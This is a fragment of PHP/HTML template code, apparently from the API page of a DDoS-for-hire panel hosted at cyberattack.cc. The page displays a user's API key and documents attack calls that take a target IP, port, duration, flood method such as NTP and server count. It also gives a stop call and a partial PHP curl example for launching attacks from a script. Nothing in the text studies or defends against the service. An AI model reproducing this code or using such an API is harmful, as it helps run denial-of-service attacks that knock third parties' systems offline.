    ...
    <div class="container-fluid">
	  ...
	  <div class="widget-content">
          ...
          <div class="white-box">
		  	...
		  	<form method="POST">
		  		<?php if($key == '0'){?>
	            <input class="form-control" type="text" value="API is unavailable or api-key is disabled! Click 'Generate new api-key'." readonly="" style="color:red;">
	            <?php }else{?>
				<?php if($user->api($odb)){?>
				<?php if($user->isVip($odb)){?>
	            <input class="form-control" type="text" value="https://cyberattack.cc/*/api/api.php?key=<?php echo $key;?>&host=[ip]&port=[port]&time=[Seconds]&method=[Method/stop]&vip=[1=on/0=off]" readonly="" style="color:red;">
	            <?php }else{?>
				<input class="form-control" type="text" value="https://cyberattack.cc/*/api/api.php?key=<?php echo $key;?>&host=[ip]&port=[port]&time=[Seconds]&method=[Method/stop]&vip=0" readonly="" style="color:red;">
				<?php }?>
				<?php }else{?>
				<input class="form-control" type="text" value="You need api access for use this!" readonly="" style="color:red;">
				<?php }?>
				<?php }?>
	...
	<div class="card">
		...
		<div id="faq2_q1" class="collapse" role="tabpanel" aria-labelledby="faq2_h1">
			...
			<?php if($user->api($odb)){?>
				...
				<code style="color:red;">
				Examples:<br>
				https://cyberattack.cc/*/api/api.php?key=[KEY]&host=[IPv4]&port=[PORT]&time=[SECONDS]&method=[METHOD/STOP]&totalservers=[SERVERS]&vip=[1 or 0]<br>
				https://cyberattack.cc/*/api/api.php?key=[KEY]&host=0.0.0.0&port=80&time=30&method=NTP&totalservers=1&vip=0<br>
				</code>
				</p>
				<p>Stop</p>
				<p>
				<code style="color:red;">
				Examples:<br>
				https://cyberattack.cc/*/api/api.php?key=[KEY]&host=[IPv4]&port=[PORT]&time=[SECONDS]&method=stop<br>
				https://cyberattack.cc/*/api/api.php?key=[KEY]&host=0.0.0.0&port=80&time=30&method=stop&totalservers=1&vip=0<br>
				</code>
				
				<p>Example Using php Curl</p>
				<code style="color:red;">
				<br>
				  			    $apiurl = 'https://cyberattack.cc/*/api/apiaexample.php?key=xxxxxxxxxxxxxx&host='. $host .'&port='. $port .'&time='. $time .'&method='. $method .'&totalservers='. $totalservers .'&vip=0';<br>
			<br>
                                            $ch = curl_init();<br>
				...
				<?php }else{?>
				<code style="color:red;">
				You need API Access to use this!
